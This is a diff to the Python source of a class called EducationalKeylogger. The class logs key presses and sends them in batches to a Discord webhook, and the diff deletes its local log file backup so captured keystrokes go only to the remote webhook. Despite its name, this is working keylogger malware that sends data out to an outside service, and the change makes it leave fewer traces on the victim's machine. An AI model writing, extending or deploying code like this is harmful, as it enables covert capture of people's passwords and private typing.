@@ -18,7 +18,6 @@ class EducationalKeylogger:
         """
         self.webhook_url = webhook_url
         self.key_log = []
-        self.log_file = "keystrokes.txt"
         self.interval = 300
         
     def on_press(self, key):
@@ -49,13 +48,7 @@ class EducationalKeylogger:
             else:
                 self.key_log.append(f" [{str(key)}] ")
     
-    def save_to_file(self):
-        """Save keystrokes to local file"""
-        with open(self.log_file, 'a') as f:
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            f.write(f"\n[{timestamp}] Session Log:\n")
-            f.write(''.join(self.key_log))
-            f.write("\n" + "="*50 + "\n")
+   
     
     def send_to_discord(self):
         """Send keystrokes to Discord webhook"""
@@ -79,8 +72,6 @@ class EducationalKeylogger:
                 time.sleep(1)  # Rate limiting
             except Exception as e:
                 pass
-        # Save to file as backup
-        self.save_to_file()
         
         # Clear the log
         self.key_log = []
